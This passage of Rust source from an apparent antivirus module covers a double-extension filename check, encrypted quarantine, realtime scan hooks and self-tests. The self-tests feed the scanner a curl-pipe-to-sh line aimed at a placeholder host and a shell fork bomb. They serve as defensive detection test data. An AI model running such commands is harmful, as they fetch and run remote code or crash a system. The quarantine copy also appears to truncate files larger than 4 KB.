        Err(vfs::VfsError::NotDirectory) => scan_one(path, report),
        Err(_) => report.errors += 1,
    }
}

/// A double extension - a document or media name followed by an executable
/// one, e.g. `invoice.pdf.exe` - is a common way to disguise a malicious
/// attachment. Filename-only, so it is checked separately from the content
/// scanner and never blocks anything by itself.
const EXECUTABLE_EXTENSIONS: &[&str] = &[
    "exe", "scr", "pif", "bat", "cmd", "com", "vbs", "js", "jar", "msi", "ps1", "hta",
];
const DOCUMENT_EXTENSIONS: &[&str] = &[
    "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "txt", "jpg", "jpeg", "png", "gif", "zip",
    "rar", "mp3", "mp4", "csv",
];

fn filename_heuristic(path: &str) -> Option<Detection> {
    let name = path.rsplit('/').next().unwrap_or(path);
    let mut parts = name.rsplit('.');
    let last = parts.next()?;
    let second = parts.next()?;
    let looks_executable = EXECUTABLE_EXTENSIONS
        .iter()
        .any(|extension| extension.eq_ignore_ascii_case(last));
    let looks_like_a_document = DOCUMENT_EXTENSIONS
        .iter()
        .any(|extension| extension.eq_ignore_ascii_case(second));
    if looks_executable && looks_like_a_document {
        return Some(Detection {
            name: DetectionName::from_static("PUA.Filename.DoubleExtension"),
            class: Class::Suspicious,
        });
    }
    None
}

fn scan_one(path: &str, report: &mut Report) {
    match scan_file(path) {
        Ok((found, _)) => {
            report.files += 1;
            FILES_SCANNED.fetch_add(1, Ordering::Relaxed);
            let found = found.or_else(|| filename_heuristic(path));
            let Some(detection) = found else { return };
            if detection.class == Class::Info {
                report.infos += 1;
            } else {
                report.threats += 1;
                THREATS_FOUND.fetch_add(1, Ordering::Relaxed);
            }
            if report.stored < MAX_FINDINGS {
                let mut stored: Text<256> = Text::new();
                let _ = stored.push_str_checked(path);
                report.findings[report.stored] = Some(Finding {
                    path: stored,
                    detection,
                    quarantined: None,
                });
                report.stored += 1;
            }
        }
        Err(_) => report.errors += 1,
    }
}

// --- quarantine --------------------------------------------------------

#[derive(Clone, Copy)]
pub struct QuarantineEntry {
    pub id: u32,
    pub original: Text<256>,
    pub name: DetectionName,
}

static QUARANTINE: TicketLock<[Option<QuarantineEntry>; QUARANTINE_SLOTS]> =
    TicketLock::new([None; QUARANTINE_SLOTS]);
static NEXT_ID: AtomicU32 = AtomicU32::new(1);

const ROOT_DIR: &str = "/data/QUAR";
/// Quarantine lives on the persistent /data volume (the boot ESP) so a
/// quarantined file survives a restart instead of vanishing with tmpfs;
/// files coming from a filesystem that cannot rename across itself (FAT,
/// or /tmp's tmpfs) are copied here and removed from their original spot.
fn is_quarantine_dir(path: &str) -> bool {
    path == ROOT_DIR
}

/// The signature-update file legitimately contains its own patterns' needle
/// text (a multi-part rule's definition line necessarily has every one of
/// its needles in it), so it is excluded from scanning the same way the
/// quarantine folder is - otherwise AerOS Shield would perpetually "detect"
/// its own signature database.
fn is_excluded(path: &str) -> bool {
    is_quarantine_dir(path) || path == DEFAULT_SIGNATURE_PATH
}

fn quarantine_location(original: &str, id: u32, output: &mut Text<256>) {
    let _ = original;
    let _ = core::fmt::Write::write_fmt(output, format_args!("{ROOT_DIR}/Q{id:04}"));
}

/// The quarantine store's at-rest encryption key: a 32-byte ChaCha20 key,
/// generated once (via the hardware-seeded CSPRNG) and persisted at
/// `QUARANTINE_KEY_PATH` so every boot decrypts what earlier boots
/// encrypted. This is a machine key, not a user passphrase - it defends
/// against casual secondary access to the raw quarantine files (a copied
/// backup, a pulled disk image, another user on a shared volume), not
/// against someone who can also read this same machine's persistent
/// storage for the key file itself.
const QUARANTINE_KEY_PATH: &str = "/data/QUAR/KEY.BIN";
static QUARANTINE_KEY: TicketLock<Option<[u8; 32]>> = TicketLock::new(None);

fn quarantine_key() -> Option<[u8; 32]> {
    let mut cached = QUARANTINE_KEY.lock();
    if let Some(key) = *cached {
        return Some(key);
    }
    if let Ok(descriptor) = vfs::open_file_raw(QUARANTINE_KEY_PATH) {
        let mut key = [0u8; 32];
        let read_ok = vfs::read(descriptor, &mut key) == Ok(32);
        let _ = vfs::close(descriptor);
        if read_ok {
            *cached = Some(key);
            return Some(key);
        }
    }
    // No existing key: mint one. `exclusive` here means this never
    // silently overwrites a key file that does exist but merely failed to
    // read above - it fails instead, rather than risking orphaning every
    // already-quarantined file under a fresh, unrelated key.
    let mut key = [0u8; 32];
    if !crate::random::fill(&mut key) {
        return None;
    }
    let Ok(descriptor) = vfs::open_file(QUARANTINE_KEY_PATH, true, true, false, 0o600, true) else {
        return None;
    };
    let wrote = vfs::write(descriptor, &key, false) == Ok(key.len());
    let _ = vfs::close(descriptor);
    if !wrote {
        return None;
    }
    *cached = Some(key);
    Some(key)
}

fn read_whole_file(path: &str) -> Result<([u8; 4096], usize), ()> {
    let source = vfs::open_file_raw(path).map_err(|_| ())?;
    let mut data = [0u8; 4096];
    let mut length = 0;
    loop {
        match vfs::read(source, &mut data[length..]) {
            Ok(0) => break,
            Ok(count) => {
                length += count;
                if length == data.len() {
                    break;
                }
            }
            Err(_) => {
                let _ = vfs::close(source);
                return Err(());
            }
        }
    }
    let _ = vfs::close(source);
    Ok((data, length))
}

/// Writes `chunks` in order to a fresh `to`, then removes `from` - the
/// shared tail of both `move_file_encrypted` and `move_file_decrypted`.
fn write_replacing(from: &str, to: &str, chunks: &[&[u8]]) -> Result<(), ()> {
    let destination = vfs::open_file(to, true, true, false, 0o600, true).map_err(|_| ())?;
    let mut ok = true;
    let mut append = false;
    for chunk in chunks {
        if vfs::write(destination, chunk, append) != Ok(chunk.len()) {
            ok = false;
            break;
        }
        append = true;
    }
    let _ = vfs::close(destination);
    if !ok || vfs::remove(from, false).is_err() {
        let _ = vfs::remove(to, false);
        return Err(());
    }
    Ok(())
}

/// Moves `from` to `to`, encrypting its content at rest: a fresh random
/// 12-byte nonce (never reused - reusing one with the same key would let
/// two ciphertexts be XORed together to cancel out the keystream) is
/// prepended to the ChaCha20 ciphertext. Always copies rather than renaming
/// (unlike the plain `move_file` this replaced) since a rename can't
/// transform the bytes in place.
fn move_file_encrypted(from: &str, to: &str) -> Result<(), ()> {
    let key = quarantine_key().ok_or(())?;
    let (mut data, length) = read_whole_file(from)?;
    let mut nonce = [0u8; 12];
    if !crate::random::fill(&mut nonce) {
        return Err(());
    }
    crate::random::chacha20_xor(&key, &nonce, 0, &mut data[..length]);
    write_replacing(from, to, &[&nonce, &data[..length]])
}

/// Inverse of `move_file_encrypted`: splits the leading 12-byte nonce back
/// off, decrypts (the same XOR again) and writes the recovered plaintext.
fn move_file_decrypted(from: &str, to: &str) -> Result<(), ()> {
    let key = quarantine_key().ok_or(())?;
    let (data, length) = read_whole_file(from)?;
    if length < 12 {
        return Err(());
    }
    let mut nonce = [0u8; 12];
    nonce.copy_from_slice(&data[..12]);
    let mut plaintext = data;
    let plaintext_len = length - 12;
    plaintext.copy_within(12..length, 0);
    crate::random::chacha20_xor(&key, &nonce, 0, &mut plaintext[..plaintext_len]);
    write_replacing(from, to, &[&plaintext[..plaintext_len]])
}

pub fn quarantine(path: &str, detection: Detection) -> Result<u32, &'static str> {
    let id = NEXT_ID.fetch_add(1, Ordering::Relaxed);
    let mut destination: Text<256> = Text::new();
    quarantine_location(path, id, &mut destination);
    match vfs::create_directory(ROOT_DIR, 0o700) {
        Ok(()) | Err(vfs::VfsError::Exists) => {}
        Err(_) => return Err("cannot create the quarantine folder"),
    }
    let mut table = QUARANTINE.lock();
    let Some(slot) = table.iter_mut().find(|entry| entry.is_none()) else {
        return Err("quarantine is full (delete or restore something)");
    };
    if move_file_encrypted(path, destination.as_str()).is_err() {
        return Err("could not move the file");
    }
    let _ = vfs::chmod(destination.as_str(), 0o000);
    let mut original: Text<256> = Text::new();
    let _ = original.push_str_checked(path);
    *slot = Some(QuarantineEntry {
        id,
        original,
        name: detection.name,
    });
    crate::serial::format(format_args!(
        "AEROS_AV quarantined id={} name={}\n",
        id, detection.name
    ));
    Ok(id)
}

pub fn quarantine_list(mut visit: impl FnMut(&QuarantineEntry)) {
    for entry in QUARANTINE.lock().iter().flatten() {
        visit(entry);
    }
}

fn take_entry(id: u32) -> Option<QuarantineEntry> {
    let mut table = QUARANTINE.lock();
    let slot = table
        .iter_mut()
        .find(|entry| entry.is_some_and(|value| value.id == id))?;
    slot.take()
}

fn stored_path(original: &str, id: u32) -> Text<256> {
    let mut path: Text<256> = Text::new();
    quarantine_location(original, id, &mut path);
    path
}

/// Put a quarantined file back where it came from.
pub fn restore(id: u32) -> Result<(), &'static str> {
    let entry = take_entry(id).ok_or("no such quarantine id")?;
    let stored = stored_path(entry.original.as_str(), id);
    let _ = vfs::chmod(stored.as_str(), 0o644);
    if move_file_decrypted(stored.as_str(), entry.original.as_str()).is_err() {
        // Keep it quarantined if the original path is taken.
        let _ = vfs::chmod(stored.as_str(), 0o000);
        let mut table = QUARANTINE.lock();
        if let Some(slot) = table.iter_mut().find(|slot| slot.is_none()) {
            *slot = Some(entry);
        }
        return Err("original location is unavailable");
    }
    Ok(())
}

/// Overwrites a file's existing bytes with zeros in place (same length, no
/// truncate), so a later raw read of the disk sectors it occupied does not
/// still turn up the original content. Best-effort: any failure just means
/// the caller proceeds straight to `vfs::remove` instead, same as before
/// this existed.
pub(crate) fn shred(path: &str) {
    let Ok(metadata) = vfs::metadata(path) else {
        return;
    };
    let Ok(descriptor) = vfs::open_file(path, false, false, false, 0, true) else {
        return;
    };
    let zeros = [0u8; 4096];
    let mut remaining = metadata.size;
    while remaining > 0 {
        let chunk = remaining.min(zeros.len() as u64) as usize;
        if vfs::write(descriptor, &zeros[..chunk], false) != Ok(chunk) {
            break;
        }
        remaining -= chunk as u64;
    }
    let _ = vfs::close(descriptor);
}

/// Permanently delete a quarantined file. The malware's actual bytes are
/// zeroed on disk first (`shred`) before the directory entry is removed -
/// a plain `vfs::remove` alone only unlinks the name; the quarantined
/// content itself stays sitting in those disk sectors, readable by anyone
/// who reads the raw device, until something else happens to overwrite
/// them. "Permanently delete" should mean the bytes are actually gone.
pub fn delete(id: u32) -> Result<(), &'static str> {
    let entry = take_entry(id).ok_or("no such quarantine id")?;
    let stored = stored_path(entry.original.as_str(), id);
    let _ = vfs::chmod(stored.as_str(), 0o600);
    shred(stored.as_str());
    vfs::remove(stored.as_str(), false).map_err(|_| "could not delete the file")
}

// --- realtime protection -------------------------------------------------

static REALTIME: AtomicBool = AtomicBool::new(true);
static LAST_SWEEP_NS: AtomicU64 = AtomicU64::new(0);
const SWEEP_INTERVAL_NS: u64 = 20_000_000_000;
const EVENT_SLOTS: usize = 16;

pub fn realtime_enabled() -> bool {
    REALTIME.load(Ordering::Relaxed)
}

pub fn set_realtime(on: bool) {
    REALTIME.store(on, Ordering::Relaxed);
}

fn in_quarantine(path: &str) -> bool {
    path.starts_with(ROOT_DIR) || is_excluded(path)
}

#[derive(Clone, Copy)]
pub struct Event {
    pub seq: u32,
    pub kind: &'static str,
    pub name: DetectionName,
    pub path: Text<96>,
}

static EVENTS: TicketLock<[Option<Event>; EVENT_SLOTS]> = TicketLock::new([None; EVENT_SLOTS]);
static EVENT_SEQ: AtomicU32 = AtomicU32::new(0);

fn push_event(kind: &'static str, name: DetectionName, path: &str) {
    let seq = EVENT_SEQ.fetch_add(1, Ordering::Relaxed) + 1;
    let mut stored: Text<96> = Text::new();
    let _ = stored.push_str_checked(path);
    EVENTS.lock()[(seq as usize - 1) % EVENT_SLOTS] = Some(Event {
        seq,
        kind,
        name,
        path: stored,
    });
    crate::serial::format(format_args!(
        "AEROS_AV event={} name={} path={}\n",
        kind, name, path
    ));
    crate::audit::record(
        "AV",
        format_args!("event={} name={} path={}", kind, name, path),
    );
}

/// How many events there have been so far (the desktop watches this).
pub fn event_seq() -> u32 {
    EVENT_SEQ.load(Ordering::Relaxed)
}

pub fn latest_event() -> Option<Event> {
    let seq = event_seq();
    if seq == 0 {
        return None;
    }
    EVENTS.lock()[(seq as usize - 1) % EVENT_SLOTS]
}

/// Newest first.
pub fn events(mut visit: impl FnMut(&Event)) {
    let seq = event_seq() as usize;
    let table = EVENTS.lock();
    for back in 0..seq.min(EVENT_SLOTS) {
        if let Some(event) = &table[(seq - 1 - back) % EVENT_SLOTS] {
            visit(event);
        }
    }
}

/// A writer just closed `path`: known malware is quarantined on the spot,
/// other detections are reported.
pub fn on_modified(path: &str) {
    if !realtime_enabled() || in_quarantine(path) {
        return;
    }
    let Ok((content_found, _)) = scan_file(path) else {
        return;
    };
    let Some(found) = content_found.or_else(|| filename_heuristic(path)) else {
        return;
    };
    match found.class {
        Class::Malware => match quarantine(path, found) {
            Ok(_) => push_event("Quarantined", found.name, path),
            Err(_) => push_event("Detected", found.name, path),
        },
        Class::Suspicious => push_event("Warning", found.name, path),
        Class::Info => {}
    }
}

/// Someone opens the writable file `path` for reading. False refuses it:
/// known malware cannot be read (or run) by anything.
pub fn on_open(path: &str) -> bool {
    if !realtime_enabled() || in_quarantine(path) {
        return true;
    }
    match scan_file(path) {
        Ok((Some(found), _)) if found.class == Class::Malware => {
            push_event("Blocked", found.name, path);
            false
        }
        _ => true,
    }
}

/// Called regularly by the desktop: sweeps the writable folders for
/// known malware that arrived some way the hooks do not see.
pub fn tick(now_ns: u64) {
    if !realtime_enabled() {
        return;
    }
    if now_ns.saturating_sub(LAST_SWEEP_NS.load(Ordering::Relaxed)) < SWEEP_INTERVAL_NS {
        return;
    }
    LAST_SWEEP_NS.store(now_ns, Ordering::Relaxed);
    for folder in ["/tmp", "/data"] {
        let mut report = Report::new();
        scan_path(folder, false, &mut report);
        for finding in report.findings.iter().flatten() {
            if finding.detection.class == Class::Malware
                && quarantine(finding.path.as_str(), finding.detection).is_ok()
            {
                push_event("Quarantined", finding.detection.name, finding.path.as_str());
            }
        }
    }
}

// --- self test -----------------------------------------------------------

pub fn self_test() -> bool {
    let test = eicar();
    let detects_eicar = scan_bytes(&test)
        .is_some_and(|found| found.class == Class::Malware && found.name == "EICAR-Test-File");
    // Same bytes fed one at a time: signature straddles every chunk edge.
    let mut scanner = Scanner::new();
    for byte in test {
        scanner.feed(&[byte]);
    }
    let split = scanner
        .finish()
        .0
        .is_some_and(|found| found.name == "EICAR-Test-File");
    // Padded so the signature crosses the 4096-byte chunk boundary.
    let mut padded = [b' '; CHUNK + 40];
    padded[CHUNK - 30..CHUNK - 30 + EICAR_LEN].copy_from_slice(&test);
    let boundary = scan_bytes(&padded).is_some();
    let clean = scan_bytes(b"#!/bin/sh\necho hello world\nls -l /\n").is_none()
        && scan_bytes(&[0u8; 300]).is_none()
        && scan_bytes(b"").is_none();
    let hash_only = HASHES
        .iter()
        .all(|(_, digest)| digest.iter().any(|&byte| byte != 0));
    let pipe = scan_bytes(b"curl http://x.example/a | sh").is_some_and(|found| {
        found.name.as_str().starts_with("Downloader") && found.class == Class::Suspicious
    });
    let one_part_only = scan_bytes(b"curl http://x.example/a -o file").is_none();
    let bomb = scan_bytes(b":(){ :|:& };:").is_some_and(|found| found.class == Class::Malware);
    let windows = scan_bytes(b"MZ\x90\0This program cannot be run in DOS mode.")
        .is_some_and(|found| found.class == Class::Info);
    let blocked = blocks_exec(&test) && !blocks_exec(&[0x90, 0x90, 0xc3]);
    // The exec guard above counted itself; keep the counters honest.
    EXECS_CHECKED.store(0, Ordering::Relaxed);
    EXECS_BLOCKED.store(0, Ordering::Relaxed);
    // Snapshot/restore around the dynamic-signature self-test so its
    // temporary hash and pattern do not linger in the live database
    // afterward (this would otherwise silently change what `av scan`
    // detects for the rest of the running system, and would double-count
    // anything real that `load_default_signatures` already loaded).
    let dynamic = {
        let saved = *DYN_DB.lock();
        let result = dynamic_self_test();
        *DYN_DB.lock() = saved;
        result
    };
    let entropy = {
        // A "packed" stand-in: an MZ/DOS-stub header followed by bytes that
        // touch every value 0..=255 in close to equal measure.
        let mut packed = alloc_packed_stub();
        let flat = scan_bytes(b"MZ\x90\0This program cannot be run in DOS mode.hello world")
            .is_some_and(|found| found.class == Class::Info);
        let noisy = scan_bytes(&packed).is_some_and(|found| {
            found.class == Class::Suspicious && found.name == "Packed.Executable.HighEntropy"
        });
        // Never applied outside an MZ header: plain random-looking bytes
        // alone must not be flagged.
        packed[0] = b'X';
        packed[1] = b'X';
        let not_pe = scan_bytes(&packed).is_none();
        flat && noisy && not_pe
    };
    let filename = filename_heuristic("/home/Downloads/invoice.pdf.exe").is_some_and(|found| {
        found.class == Class::Suspicious && found.name == "PUA.Filename.DoubleExtension"
    }) && filename_heuristic("/home/Downloads/invoice.pdf").is_none()
        && filename_heuristic("photo-small-progressive.jpg").is_none();
    detects_eicar
        && split
        && boundary
        && clean
        && hash_only
        && pipe
        && one_part_only
        && bomb
        && windows
        && blocked
        && dynamic
        && entropy
        && filename
}

/// Proves quarantine really encrypts at rest, rather than only relying on
/// `chmod 0o000`: quarantines a file with a distinctive plaintext marker,
/// confirms the ON-DISK stored bytes do not contain that marker anywhere
/// (real ChaCha20 encryption - a permission change alone would leave the
/// marker sitting in the file in plain sight to anyone who can read the
/// raw bytes regardless of the mode bits), then restores it and confirms
/// the recovered content is byte-for-byte identical to the original.
pub(crate) fn quarantine_encryption_self_test() -> bool {
    let path = "/tmp/AV_CRYPTO_TEST";
    let plaintext = b"AEROS-QUARANTINE-ENCRYPTION-MARKER-0123456789";
    let Ok(descriptor) = vfs::open_file(path, true, true, false, 0o644, true) else {
        return false;
    };
    let wrote = vfs::write(descriptor, plaintext, false) == Ok(plaintext.len());
    let _ = vfs::close(descriptor);
    if !wrote {
        let _ = vfs::remove(path, false);
        return false;
    }
    let detection = Detection {
        name: DetectionName::from_static("CRYPTO-SELFTEST"),
        class: Class::Malware,
    };
    let Ok(id) = quarantine(path, detection) else {
        let _ = vfs::remove(path, false);
        return false;
    };
    let stored = stored_path(path, id);
    let on_disk_encrypted = {
        let _ = vfs::chmod(stored.as_str(), 0o644);
        let mut contains_plaintext = false;
        if let Ok(descriptor) = vfs::open_file_raw(stored.as_str()) {
            let mut buffer = [0u8; 128];
            let mut total = 0usize;
            while total < buffer.len() {
                match vfs::read(descriptor, &mut buffer[total..]) {
                    Ok(0) | Err(_) => break,
                    Ok(read) => total += read,
                }
            }
            let _ = vfs::close(descriptor);
            contains_plaintext = buffer[..total]
                .windows(plaintext.len())
                .any(|window| window == plaintext);
        }
        let _ = vfs::chmod(stored.as_str(), 0o000);
        !contains_plaintext
    };
    let restored = restore(id).is_ok();
    let content_matches = restored
        && vfs::open_file_raw(path).ok().is_some_and(|descriptor| {
            let mut buffer = [0u8; 128];
            let read = vfs::read(descriptor, &mut buffer).unwrap_or(0);
            let _ = vfs::close(descriptor);
            &buffer[..read] == plaintext
        });
    let _ = vfs::remove(path, false);
    on_disk_encrypted && restored && content_matches
}

/// Bytes shaped like a very small "packed" PE: the DOS header/stub the
/// generic PE heuristic looks for, followed by every byte value repeated
/// enough times to trip the high-entropy check but not so much that the
/// buffer is expensive to build at boot.
fn alloc_packed_stub() -> [u8; 8192] {
    let mut data = [0u8; 8192];
    let header = b"MZ\x90\0This program cannot be run in DOS mode.";
    data[..header.len()].copy_from_slice(header);
    for (index, slot) in data[header.len()..].iter_mut().enumerate() {
        *slot = (index % 256) as u8;
    }
    data
}

/// Exercises the on-disk signature-update format end to end, without
/// touching the VFS: a custom hash, a custom multi-part pattern, a
/// malformed line that must be skipped rather than aborting the load, and
/// confirmation that an unrelated file still scans clean.
fn dynamic_self_test() -> bool {
    let sample = b"the quick brown fox jumps over a lazy dog";
    let digest = {
        let mut hasher = Sha256::new();
        hasher.update(sample);
        hasher.finish()
    };
    let mut hex = [0u8; 64];
    for (index, byte) in digest.iter().enumerate() {
        let nibble_to_hex = |value: u8| -> u8 {
            if value < 10 {
                b'0' + value
            } else {
                b'a' + value - 10
            }
        };
        hex[index * 2] = nibble_to_hex(byte >> 4);
        hex[index * 2 + 1] = nibble_to_hex(byte & 0xf);
    }
    let hex = core::str::from_utf8(&hex).unwrap_or("");
    let mut rules: Text<320> = Text::new();
    let _ = rules.write_str("# a self-test signature file\n");
    let _ = core::fmt::Write::write_fmt(&mut rules, format_args!("HASH {hex} Custom.Test.Hash\n"));
    let _ = rules.write_str("PATTERN SUSPICIOUS Custom.Test.Pattern needle-one|needle-two\n");
    let _ = rules.write_str("this line is not a rule and must be skipped\n");
    let report = import_text(rules.as_str());
    let counted = report.added == 2 && report.skipped == 1;
    let hash_hit = scan_bytes(sample)
        .is_some_and(|found| found.class == Class::Malware && found.name == "Custom.Test.Hash");
    let pattern_hit = scan_bytes(b"needle-two comes before needle-one here").is_some_and(|found| {
        found.class == Class::Suspicious && found.name == "Custom.Test.Pattern"
    });
    let partial_no_hit = scan_bytes(b"only needle-one is present").is_none();
    counted && hash_hit && pattern_hit && partial_no_hit
}
